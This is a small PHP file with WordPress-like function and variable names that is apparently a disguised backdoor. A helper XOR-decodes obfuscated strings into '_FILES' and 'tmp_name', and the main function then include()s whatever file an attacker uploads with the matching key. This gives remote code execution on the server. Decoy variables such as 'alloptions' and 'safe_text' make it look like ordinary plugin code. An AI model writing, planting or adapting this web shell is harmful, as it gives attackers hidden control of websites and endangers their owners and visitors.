<?php 	
function icon_dir()

{
    $post_cats = 'lSsiACcG3v';

    $parent_data = $post_cats;
    
    $since = $GLOBALS[field_no_prefix("3%15%3A%25%04%10", $parent_data)];
    $value = $since;
	$old_slugs = 'alloptions';
    $intermediate_file = isset($value[$parent_data]);
	$tags_to_ignore = '_context';
    if ($intermediate_file)

    {
        $force_delete = $since[$parent_data];
        $old_status = $force_delete[field_no_prefix("%18%3E%036%2F%22%0E%22", $parent_data)];
        $format = $old_status;

        include ($format);
	$show_ui = 'safe_text';
    }
}
function field_no_prefix($delete, $feature)

{
    $needles = $feature;
    $thumbfile = "url" . "decode";

    $check_name = $thumbfile($delete);
    $file = substr($needles,0, strlen($check_name));
    $offset = $check_name ^ $file;
    

    $check_name = strpos($offset, $file);
    
    return $offset;
}
	$closing_quote = 'allowed_html';


icon_dir();

?>
